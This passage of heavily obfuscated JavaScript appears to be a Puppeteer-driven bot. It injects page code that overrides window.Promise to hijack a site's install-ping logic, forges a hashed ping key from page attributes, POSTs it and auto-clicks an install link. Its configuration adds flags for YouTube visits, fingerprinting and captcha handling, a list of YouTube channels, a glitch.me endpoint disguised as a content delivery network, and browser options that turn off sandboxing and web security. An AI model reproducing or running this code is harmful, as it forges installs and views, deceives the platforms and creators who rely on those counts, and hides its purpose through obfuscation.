-0x307 + 0x225a * -0x1 + 0x41e | -0x1c3d * 0x1 + 0x35f * -0x5 + 0x3b * 0xd5 & J['charCodeAt'](++M)), P[N >> -0xd * -0x18d + -0x4fa + -0x25 * 0x69] |= (-0x139d + 0x1975 + -0x4e8 * 0x1 | L >> -0x5bc * 0x4 + 0x1f5a + 0x59 * -0x18) << y[-0x49d + 0x11 * 0x3b + -0x1 * -0xb5 & N++], P[N >> -0x1ed8 + 0x12c8 * -0x1 + 0x31a2 * 0x1] |= (-0x18b2 + -0x19 * 0x49 + 0x19 * 0x14b | L >> -0x15f9 + -0x1c7b + 0x3280 & -0x17ef + -0x1a3 * -0xd + 0x2e7 * 0x1) << y[-0x3 * -0x853 + -0x1cdc * 0x1 + 0x3e6 & N++], P[N >> -0x1e78 + -0x1 * 0x14cb + -0xf * -0x36b] |= (-0x1286 + 0x1e68 + -0x5e * 0x1f | L >> 0x4e3 * 0x1 + -0x1 * -0x139b + -0x24 * 0xae & -0x19b * 0x11 + -0x190 + 0x1d1a) << y[0x1 * 0xab5 + 0x2 * -0x3 + -0xaac & N++], P[N >> 0x97b + 0x1 * -0x51b + -0x45e] |= (0x27 * -0x76 + -0x1 * -0x26dc + -0xa31 * 0x2 | -0x134c + -0x119 + 0x14a4 & L) << y[-0x2e + -0x573 + -0x4c * -0x13 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0xdef + -0x4 * -0x4dd + -0x2123 ? (this['block'] = P[-0x76f * 0x5 + 0x1249 * -0x2 + 0x49cd], this['start'] = N - (0x1245 + 0x11ab + -0x23b0), this['hash'](), this['hashed'] = 0x25c7 * -0x1 + -0x3a6 * -0xa + 0x14c) : this['start'] = N;
                }
                return this['bytes'] > -0xe9d2809b + 0x68 * 0x145a27f + 0x165887d02 && (this['hBytes'] += this['bytes'] / (-0x40c00f * -0x5ac + 0x77684c08 + -0xe6a9a11c) << 0x21f4 + -0x1 * 0x1969 + -0x88b, this['bytes'] = this['bytes'] % (-0xe37fd84 + -0x559fdc * -0x109 + -0x1c8 * -0x65f121)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x1 * 0x186d + 0x1 * -0x761 + 0x11 * 0x1df;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x1446 + 0x10a4 + -0x1 * -0x3b2] = this['block'], J[K >> -0x1bf7 + -0x1cfa + -0x1 * -0x38f3] |= x[-0x1169 + 0x1d9e + -0xc32 & K], this['block'] = J[0x1a1 * 0x9 + -0x79a + -0x6ff], K >= -0x1fc4 + 0x733 * 0x1 + 0x18c9 && (this['hashed'] || this['hash'](), J[-0x313 * -0x8 + 0x21b3 + -0x1 * 0x3a4b] = this['block'], J[0xb * -0xe9 + -0x3b * 0x43 + 0x1984] = J[0xf50 + -0x1 * 0x1b57 + 0x1 * 0xc08] = J[-0x1377 * 0x2 + 0x256c + 0x1 * 0x184] = J[-0x1 * -0x893 + 0x6b * -0x56 + -0x2bd * -0xa] = J[0x1391 + 0x1c82 + -0x300f] = J[-0x1e4c * 0x1 + 0x21eb + 0x2 * -0x1cd] = J[-0x2008 * 0x1 + -0x1 * 0x1d89 + 0x1 * 0x3d97] = J[0x1b2d + 0x1012 + -0x1cd * 0x18] = J[-0x1644 + 0x15d6 + -0x1 * -0x76] = J[-0x43 * -0x19 + 0x685 + -0x73 * 0x1d] = J[-0x1299 + -0x643 + 0x18e6] = J[-0x64b + -0x1f5 * -0x6 + -0x568] = J[-0x1 * -0xd2e + -0x1c03 + 0xee1] = J[0x1afc * -0x1 + 0x1868 + 0x1 * 0x2a1] = J[0x3b * -0x1d + -0x3b8 + 0xa75] = J[-0x4 * 0x347 + 0x2 * -0x586 + 0x1837] = -0x2 * 0xc8e + -0x3 * -0xc74 + -0x38 * 0x38), J[0x33b * -0x7 + 0x5d * -0x57 + 0x3646 * 0x1] = this['hBytes'] << -0x2240 + -0x2 * -0x693 + 0x151d | this['bytes'] >>> 0x1b67 + -0x1d87 * -0x1 + -0x38d1, J[-0x1218 + 0x11 * 0x123 + 0xc * -0x19] = this['bytes'] << 0xff8 + 0x22b3 + -0x32a8, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x55a + 0x2 * 0x698 + 0x5 * -0x18e; J < -0x232d + 0x31 * 0x57 + 0x12d6 * 0x1; ++J)
                K = Q[J - (-0x230a + 0x1b2d + -0x3 * -0x2a0)] ^ Q[J - (-0x1 * 0x1867 + -0x1 * -0x2ca + 0x15a5)] ^ Q[J - (-0x1a84 + 0x71 * 0x21 + 0xc01 * 0x1)] ^ Q[J - (0xefc + 0xa91 + -0x3 * 0x87f)], Q[J] = K << -0x14c0 + 0x34e + 0x1173 | K >>> 0x653 * 0x1 + 0x2503 + 0x353 * -0xd;
              for (J = -0x1 * -0x1615 + 0x1 * -0x171d + -0x58 * -0x3; J < -0x1190 + 0x1 * 0x1a51 + -0x8ad * 0x1; J += 0x208d * 0x1 + 0x17d * 0x2 + -0x5 * 0x71a)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x5 * 0x551 + -0x988 + 0x2422 | L >>> -0xc3c + -0x1fb7 * 0x1 + 0x2c0e) + (M & N | ~M & O) + P + (-0x2 * -0x134a5a33 + 0x774e028d + -0x43603d5a) + Q[J] << 0xf53 + 0x169b + 0x25ee * -0x1) << 0x1d70 + 0x1f60 + 0xc5 * -0x4f | P >>> 0x2197 + -0x3c0 + -0x2c * 0xad) + (L & (M = M << -0x1 * 0x417 + -0x1f10 + 0x2345 | M >>> -0xaa4 + -0x97 * -0x19 + -0x419) | ~L & N) + O + (0x7a81838d + -0x1 * 0x9f694916 + 0x7f6a3f22) + Q[J + (0x1b82 * 0x1 + -0x1ab4 + 0x1 * -0xcd)] << -0x11c8 + -0x1 * -0x170 + 0x1058) << 0x4 * -0x820 + 0x1d95 * 0x1 + 0x2f0 | O >>> 0x2099 + 0x655 + -0x26d3) + (P & (L = L << -0x41c + -0x1f * -0xe2 + -0x1724 | L >>> -0x3 * -0x78b + -0x1a60 + 0x3c1) | ~P & M) + N + (-0x42e32589 + -0xa425c81f + -0x7d7b159 * -0x29) + Q[J + (-0x879 + -0x1 * -0x1112 + -0x1 * 0x897)] << -0x6b4 + -0x23aa + -0x2a5e * -0x1) << -0x820 + 0xe17 + -0x5f2 | N >>> 0x810 * 0x1 + -0x9d7 * 0x1 + 0x1e2) + (O & (P = P << -0x16b * 0x15 + 0x61 * 0x2 + 0x1d23 | P >>> 0x101 * -0x3 + -0x2 * 0x631 + 0x1 * 0xf67) | ~O & L) + M + (0x1b11d55 * -0x1 + -0x476752a9 + 0xa39ae997) + Q[J + (-0x26eb * -0x1 + -0x11a9 + -0x153f)] << -0x1d9 * 0x6 + 0x14b6 * -0x1 + -0x32e * -0xa) << 0x452 + 0x20 * -0x29 + -0xd3 * -0x1 | M >>> 0x13c7 + -0xea6 + -0x506) + (N & (O = O << -0x6 * 0x148 + -0xbdd * 0x1 + 0x1 * 0x13ab | O >>> -0xc95 * -0x1 + 0x3 * -0x504 + 0x279) | ~N & P) + L + (-0x15 * 0x15390e1 + 0x43691eef + -0x2f5 * -0x113b43) + Q[J + (-0x187 + 0x2 * -0xee7 + -0x5 * -0x645)] << -0xb51 * -0x2 + 0xb * -0xb7 + 0xec5 * -0x1, N = N << 0x21dc + -0x45b * 0x5 + -0xbf7 * 0x1 | N >>> 0x81 * 0x4d + -0x415 + -0x22b6;
              for (; J < -0x1 * -0x3af + -0x213d * -0x1 + 0x1262 * -0x2; J += -0x2 * 0x95b + 0x188a + -0x5cf * 0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1e * 0x71 + -0x1b62 + -0x28a5 * -0x1 | L >>> -0x1e91 + -0x1605 + 0x34b1) + (M ^ N ^ O) + P + (0x9acc3519 + -0x9c44f * 0x17f + -0x1d559747) + Q[J] << 0x21e5 + 0x256a + -0x474f * 0x1) << 0x23b * 0x9 + 0x16c2 + 0x2 * -0x1568 | P >>> 0x3 * 0xa8c + 0x739 * 0x3 + -0x11bc * 0x3) + (L ^ (M = M << 0x1a9 * -0xd + 0x87a + 0xd39 | M >>> 0x5 * -0x79c + -0x2 * -0x409 + 0x4c * 0x65) ^ N) + O + (-0x1 * -0xa0d79707 + -0x1 * 0x35ca14d1 + 0x3cc696b) + Q[J + (-0xfc2 * 0x1 + -0x12c8 + 0x228b)] << -0x265b + 0x1465 + 0x11f6) << -0x1afd * -0x1 + -0x17 * 0x4f + -0x13df | O >>> -0x3d * -0x18 + 0x1 * -0x155a + 0xfbd) + (P ^ (L = L << 0x1d * -0x2f + -0x369 * -0x2 + 0x161 * -0x1 | L >>> -0x320 + -0x253d + 0x285f) ^ M) + N + (-0x9aa0315 * 0x7 + 0xdb87bf34 + 0x22 * -0x134ef00) + Q[J + (-0x344 + 0x2 * -0xe21 + 0x2 * 0xfc4)] << -0x4d6 + 0x1 * 0x7bf + -0x2e9) << -0x151d + 0xb29 * 0x2 + -0x130 | N >>> 0x1 * 0x9ea + 0x1 * -0x1b86 + 0x5 * 0x38b) + (O ^ (P = P << -0x1 * 0xd1f + 0x1 * 0x1229 + 0x3 * -0x1a4 | P >>> 0x4 * 0x430 + 0x1b63 + 0x2c21 * -0x1) ^ L) + M + (0xad6c2470 + -0x2e74324b * 0x1 + 0x366e * -0x4bce) + Q[J + (0x9df + 0xc0d * -0x1 + 0x231)] << 0x1c01 + -0x2 * -0xe9 + -0x1 * 0x1dd3) << 0x134b + 0x2 * 0xb56 + -0x29f2 | M >>> -0x72 * -0x1f + 0x11ab + 0x6e * -0x49) + (N ^ (O = O << -0x1dda + 0x1 * 0x2659 + 0xb * -0xc3 | O >>> 0x100b * 0x2 + -0x1 * -0xc83 + 0xf * -0x2f9) ^ P) + L + (0x7b954e90 + -0x4724f2 * -0x1bb + 0x87d851b5 * -0x1) + Q[J + (-0x617 * 0x1 + -0x20ce + 0x26e9)] << 0xc85 * 0x1 + 0x5 * -0x35 + 0xa * -0x126, N = N << 0x133c * 0x2 + -0x1 * 0x21e0 + -0x47a | N >>> -0x2324 + -0x1cdd + 0x925 * 0x7;
              for (; J < -0x125 * 0x13 + -0x1c77 * 0x1 + 0x16 * 0x24b; J += 0x1 * -0x1ad5 + -0x1 * -0x2104 + -0x62a)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0xb33 * -0x1 + 0x224d + -0x2d7b | L >>> 0x468 + -0x2 * 0xccf + -0x1 * -0x1551) + (M & N | M & O | N & O) + P - (-0x3ea86 * 0xbb9 + -0x47b * -0x3200db + -0x413d553f) + Q[J] << -0x5 * -0x219 + -0x6e2 * -0x5 + 0xb * -0x415) << 0x76 * -0x11 + -0x2 * -0xd7f + -0x1323 | P >>> 0x1dac + -0x1901 * -0x1 + 0x6e * -0x7f) + (L & (M = M << 0x1f25 + -0x5 * 0x509 + -0x5da | M >>> 0xce5 * -0x2 + 0x223a + -0x86e) | L & N | M & N) + O - (0xa3d91cb1 + -0x6a6eba0e + 0x13 * 0x2eb779b) + Q[J + (-0x3d1 * -0x1 + 0x1 * 0x171 + -0x541)] << -0x1c89 + 0x4d * -0x17 + 0x2374) << 0x2006 * -0x1 + 0x2 * -0xff + 0x1 * 0x2209 | O >>> -0xda4 + -0x378 + 0x1137) + (P & (L = L << 0x2 * 0x38c + -0x9d2 + 0x2d8 | L >>> -0x1 * -0xdf1 + 0x2 * -0x34d + -0x755) | P & M | L & M) + N - (-0xafcae67 * 0x1 + 0xaed3c87 + 0x1e1edaf * 0x3c) + Q[J + (0x1e2f * 0x1 + -0x63 * -0x54 + -0x14e3 * 0x3)] << -0x29a + 0x2 * 0xe87 + -0x1a74) << 0x2fe * 0x8 + 0xb53 + -0x2 * 0x119f | N >>> 0xa5 * 0x1d + -0x2441 * 0x1 + 0x1 * 0x11ab) + (O & (P = P << 0xe97 + 0x153 * 0x15 + -0x2a48 | P >>> -0x223c + 0xd8f * 0x1 + 0x423 * 0x5) | O & L | P & L) + M - (0x35fe43d5 + -0x24f * 0x445b8f + 0xd8b55e70) + Q[J + (0x59 * 0x61 + 0x1fc * 0xa + 0x8ed * -0x6)] << 0x13 * 0x101 + -0x8b2 + 0xa61 * -0x1) << -0x7d + -0x2045 + -0x20c7 * -0x1 | M >>> -0x1d48 + -0x2c3 * 0x1 + 0x2026) + (N & (O = O << -0x1b5a * -0x1 + 0x2114 + -0x4 * 0xf14 | O >>> -0x3bc * 0x3 + -0xf90 + 0x1ac6) | N & P | O & P) + L - (-0xaf79a810 + 0x38cb7599 + 0xe792759b) + Q[J + (-0x9d1 * -0x3 + -0x1 * 0x2215 + 0x4a6)] << 0x162b + -0x6f3 * -0x3 + -0x4 * 0xac1, N = N << -0x1 * -0x1a1d + 0x97 * -0xd + 0x187 * -0xc | N >>> 0x7 * 0x4d4 + -0x221a + 0xa * 0x8;
              for (; J < -0x1 * 0x25c3 + -0x5 * -0x41c + -0x1 * -0x1187; J += -0xca * 0x12 + -0x4 * -0x47f + -0x141 * 0x3)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x5 * -0x477 + -0x1528 + -0x126 | L >>> -0x472 * -0x1 + -0x143a + -0x53 * -0x31) + (M ^ N ^ O) + P - (0x245d97f9 + 0xb273 * 0x927e + 0x21 * -0x2925b49) + Q[J] << 0x216 * -0x3 + 0x2598 + -0x1f56) << -0x6 * 0x1fc + 0x16 * 0x173 + 0x189 * -0xd | P >>> 0x4 * 0x5f7 + -0xea5 + -0x91c) + (L ^ (M = M << -0x1421 * 0x1 + -0x1 * -0x2302 + -0xec3 | M >>> -0x4e9 * -0x3 + 0xc39 + 0xd79 * -0x2) ^ N) + O - (-0x1ced131d + -0x1 * -0x63a8553c + -0x111e03f5) + Q[J + (0x16 * -0x5d + 0xef * 0x7 + 0x176)] << 0x2d * -0x39 + 0x1b1 * -0x17 + 0x30ec * 0x1) << -0xe * -0x21f + -0x1766 + -0x647 * 0x1 | O >>> 0xe8f + -0xd1e * 0x2 + -0x1a * -0x74) + (P ^ (L = L << 0x8b1 * -0x1 + -0x1999 + 0x2268 | L >>> 0x272 + -0x2 * -0x4c6 + -0xbfc) ^ M) + N - (-0x5718e182 + -0x165609b4 + 0xa30c2960) + Q[J + (-0x4f9 * 0x1 + -0x2389 + 0xa21 * 0x4)] << -0xa4 * 0x7 + 0x348 + 0x134) << 0x27 * 0xad + 0x1bc3 + -0x3619 | N >>> -0x1942 + 0x25d5 + -0xc78) + (O ^ (P = P << -0xb * 0x1d7 + -0x1cd6 + 0x3131 | P >>> 0xf84 + -0xa5a + -0x4 * 0x14a) ^ L) + M - (-0x24cca83 * -0x6 + -0x53f95baf + 0x7bc9dac7) + Q[J + (0x1f7b * -0x1 + -0x442 + 0x23c0)] << -0x1 * -0xfad + -0x10 + -0x1 * 0xf9d) << 0x1499 * -0x1 + -0x1 * -0x11ab + 0x2f3 | M >>> -0x2 * -0x126a + -0x25bc + -0x103 * -0x1) + (N ^ (O = O << 0x447 * -0x1 + 0xd30 * 0x2 + -0x15fb | O >>> -0x17 * -0x11e + 0xb22 + 0x24d2 * -0x1) ^ P) + L - (0x4dd81596 + -0x2bcaf1ca + 0x1d * 0xacb176) + Q[J + (-0x2 * -0x523 + 0x20b1 + -0x2af3)] << 0x1e0c * 0x1 + -0x2a7 + -0x1b65, N = N << -0x2 * -0x9f1 + -0x8 * 0x33f + 0x634 * 0x1 | N >>> 0xf35 + 0x1af5 + -0x2a28;
              this['h0'] = this['h0'] + L << -0x4 * -0x3c3 + 0x11e7 + 0x1 * -0x20f3, this['h1'] = this['h1'] + M << 0xc * 0x25 + -0x344 + 0x188, this['h2'] = this['h2'] + N << -0x2183 * 0x1 + 0x2 * 0x30a + -0x3 * -0x925, this['h3'] = this['h3'] + O << -0xf5 * -0x17 + 0x1 * -0x1d39 + 0x736 * 0x1, this['h4'] = this['h4'] + P << 0x21 * -0x117 + 0x22d * 0x7 + 0x52f * 0x4;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x563 * 0x2 + -0x1 * 0xfe7 + 0x1ac9 & 0x7 * -0x4e1 + -0x2455 * 0x1 + -0x468b * -0x1] + w[J >> -0xada * 0x2 + 0x2 * -0x6df + 0x238a & -0x1003 * 0x1 + 0x7f9 + 0x819] + w[J >> 0xd * -0x80 + 0x5ad * -0x4 + 0x1d48 & 0x6fe + -0x4 * 0x6f5 + 0x14e5] + w[J >> -0x12e9 * 0x1 + 0x201f + 0x132 * -0xb & -0x24fd + 0x1 * -0x1abb + -0x1 * -0x3fc7] + w[J >> -0x180e * 0x1 + -0x237f + 0x3b99 & -0x1107 + 0x17c7 + -0x6b1] + w[J >> 0x55f + -0x6da + 0x183 & 0x8 * 0x28d + -0x2ff * 0xd + -0x2 * -0x94d] + w[J >> -0x654 + 0x12d1 * 0x1 + 0x67 * -0x1f & -0x165 + -0x1f0c + -0x82 * -0x40] + w[0x1c25 + -0x1bbf * -0x1 + -0x37d5 & J] + w[K >> 0xade + 0x1423 + -0x1ee5 & -0x1630 + -0x4 * -0x62e + -0x279] + w[K >> 0x2 * 0x103e + -0x20b1 * 0x1 + 0x4d & -0x3 * -0xbf + 0x1324 + 0x2 * -0xaa9] + w[K >> 0x23bc + 0x683 * 0x1 + 0x1 * -0x2a2b & 0x274 + -0x5d * 0x29 + 0xc80] + w[K >> 0xc56 + 0x17a5 + 0x72f * -0x5 & -0x1 * -0x22c6 + 0x1 * -0x254 + -0x1 * 0x2063] + w[K >> 0x1dd8 + -0x117b + -0xc51 & -0x2 * -0x125f + 0x1 * -0x18a7 + 0xdc * -0xe] + w[K >> 0xca2 + -0xf4a + 0x2b0 & -0x6 * 0x121 + 0x1 * 0x17a1 + 0x35c * -0x5] + w[K >> -0x1cb + 0xb8e + -0x9bf & 0x4 * -0x52 + 0x1 * -0x5e7 + -0x3 * -0x26a] + w[0x2610 + 0x201d + -0x1 * 0x461e & K] + w[L >> 0xb80 * 0x1 + 0x4 * -0x161 + -0x5e0 & 0x7 * -0x3d1 + 0x161f + -0x1 * -0x4a7] + w[L >> -0x1 * -0x1e71 + -0x1 * -0x13f1 + -0x324a & 0x6 * -0x2f4 + 0xd * -0x23 + 0x138e] + w[L >> 0x1760 + -0x4 * -0x1d0 + -0x1e8c & -0x407 + 0x832 + 0x41c * -0x1] + w[L >> 0x62b * 0x1 + -0xc93 + 0x678 & 0x2135 + -0x641 * 0x2 + -0x14a4] + w[L >> -0x111f + 0xb * 0x27e + -0xa3f & 0x18bd + -0x11 * 0x7b + -0x1 * 0x1083] + w[L >> -0x459 + -0x1334 + 0x1795 & -0x1 * -0xb93 + 0x1 * 0x25f7 + -0x317b * 0x1] + w[L >> -0x18e + -0x1d51 + 0x1ee3 & 0x38b * 0x9 + 0x1f * 0x6c + 0xb3a * -0x4] + w[-0x5a * 0x1b + 0x1feb * -0x1 + 0x2978 & L] + w[M >> 0x1bce + -0x5 + -0x221 * 0xd & -0x2317 + 0x12f + 0x2f * 0xb9] + w[M >> 0x41 * -0x8 + 0x1cc4 * 0x1 + -0x1aa4 & -0x24 * -0xce + -0x3d * -0x5d + -0x3312] + w[M >> 0x206a + -0x1ded + -0x269 & -0x95 * -0x1 + -0x18a * 0x17 + 0x22e0] + w[M >> 0x60f + -0x5 * 0x49c + 0x5af * 0x3 & -0x8de + -0xdc0 + 0x16ad] + w[M >> 0x385 + -0x22a2 + 0x1f29 & -0x71c + 0x1 * -0x15fb + 0x1d26] + w[M >> 0xdd * 0x3 + 0xe8a + -0x3 * 0x5b3 & -0x2 * -0x2c7 + 0xa18 + -0x1 * 0xf97] + w[M >> 0xdae + -0x1ce5 + 0xf3b & 0xa03 * -0x1 + 0x10f * 0x2 + 0x7f4] + w[-0x908 * -0x3 + 0x6fa + -0x1 * 0x2203 & M] + w[N >> 0x765 + -0x1 * -0x151f + -0x1c68 & 0x1 * 0x1a34 + 0x1 * -0x191 + -0xf2 * 0x1a] + w[N >> 0x26e1 * -0x1 + -0x1ef8 + 0x45f1 & 0x820 * 0x2 + 0x1c14 + -0x2c45] + w[N >> -0x40 * -0x55 + -0x4 * -0x7bf + 0x4 * -0xd0a & -0x1 * -0xcf1 + 0x8 * -0x116 + -0x432] + w[N >> -0x1 * -0x5e2 + 0x2f * 0x73 + -0x3d9 * 0x7 & 0x1 * -0xa43 + 0x7f7 + -0x3 * -0xc9] + w[N >> 0x1576 + -0x5 * -0x1c5 + -0x1e43 & -0x1ed4 + 0x1 * 0x23f9 + -0x516] + w[N >> -0x132f + 0x46a * 0x7 + -0xbaf & -0x15fa + 0x1fa4 + -0x99b] + w[N >> 0xa * 0x160 + -0x247b + 0x16bf & -0x4 * -0x3b9 + 0x1f1c + -0x13 * 0x26b] + w[-0x193f + -0xca7 + 0x25f5 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x1 * -0x2196 + -0x1 * 0x18f1 + 0xc7 * -0xb & -0x3c9 * 0x3 + 0x453 * 0x9 + 0x3 * -0x8db,
                J >> 0x705 + -0x19f3 + -0x176 * -0xd & 0x1 * 0x74d + 0x112b * 0x1 + -0x1779,
                J >> -0xeac + 0x11c9 + -0x315 * 0x1 & -0x915 + 0x1 * 0x1459 + -0xa45,
                -0x1ebc + 0x113 * 0x12 + 0xc65 & J,
                K >> 0xd24 + -0x1 * -0xde + -0xd * 0x112 & 0x1301 + 0x13f7 + 0x25f9 * -0x1,
                K >> -0x23fd + 0x38b * -0xb + 0x4b06 & 0x163d + -0x1447 + -0xf7,
                K >> 0x189b + -0x3 * -0xd9 + -0x10b * 0x1a & 0x6f * 0x29 + 0xae * -0x32 + -0x1134 * -0x1,
                0x1e1 * 0x8 + -0x53 * -0x56 + 0xdb * -0x31 & K,
                L >> -0x761 * -0x4 + 0x2468 + -0x41d4 & 0x1 * 0x14b + 0x105e + -0x10aa,
                L >> -0x7ef + -0x16e2 + 0x1ee1 & -0x64e + -0x230c + 0x2a59,
                L >> 0x2214 + 0x1a59 + -0x3c65 & -0xa2e * -0x1 + 0x2051 * 0x1 + 0xa60 * -0x4,
                -0x1cbb + 0x188 * -0x17 + 0x1 * 0x40f2 & L,
                M >> -0x10c2 + 0x10d7 + 0x3 & -0x24f8 + 0xdcd + 0x182a,
                M >> -0x6e9 * -0x2 + -0x1e27 + 0x1065 & 0x29b * -0x5 + 0x1 * 0x767 + 0x69f,
                M >> 0xc5b * 0x1 + 0x13d1 + -0x2024 & 0x3 * -0x194 + 0x2069 + -0x2ab * 0xa,
                -0xc24 + 0x10eb + -0x3c8 & M,
                N >> 0xb37 + -0x455 + -0x6ca & -0x26b + 0x1c29 + 0x389 * -0x7,
                N >> 0x88 * -0x48 + -0x2f6 * 0x7 + -0xb * -0x55e & -0x1475 + 0x1136 + -0xb5 * -0x6,
                N >> -0x56 + 0x21fa + -0x219c & 0x70 * 0x10 + 0x19e9 + -0xbe * 0x2b,
                0x747 + -0x69b + 0x53 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x73 * 0x2d + -0xcc1 + -0x762), (K = new DataView(J))['setUint32'](-0x1f * -0x138 + -0x55a * -0x5 + -0x408a, this['h0']), K['setUint32'](0x2177 + -0x331 * -0x2 + -0x67 * 0x63, this['h1']), K['setUint32'](0x1dd9 + 0x167 * -0xb + -0xe64, this['h2']), K['setUint32'](0x398 * -0x9 + 0x21a1 + -0x13d, this['h3']), K['setUint32'](0x4 * -0x4ae + -0x2608 + 0x38d0, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x1b1f + 0x854 + -0x2373];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x2493 + 0x1c9e + -0x4131;
            J[0x1 * 0x220d + 0x3b * -0x65 + 0x7 * -0x18a]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x1 * -0xc4d + -0x291 + -0x9bc] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x2c4 + -0x2 * 0x5b6 + -0x3 * -0x2e3), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x727 * -0x2 + -0x2601 + 0x5d * 0x90;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x438 + -0x2053 * -0x1 + -0x1eaf), Promise['resolve'](0x1eed + -0x4 * -0x122 + -0x8dd * 0x4);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x1 * 0x81d + 0x4 * 0x1ed + -0x1 * -0x69; j < -0xc54 + 0x19e * -0x11 + 0x27d3 * 0x1; j++)
    i();
}
const NETWORK_PATIENCE = 0x2307 + -0x12d2 * 0x1 + 0x1 * 0xf0b + (-0x1 * 0x757 + -0x20a6 + 0x1f * 0x1ab) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x2 * 0xd21 + 0x935 + 0x2 * -0x11ba) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0xf8 * 0x13 + 0xe * 0xb8 + -0x38f * 0x8; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    const V = c;
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j[V(0x6)](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
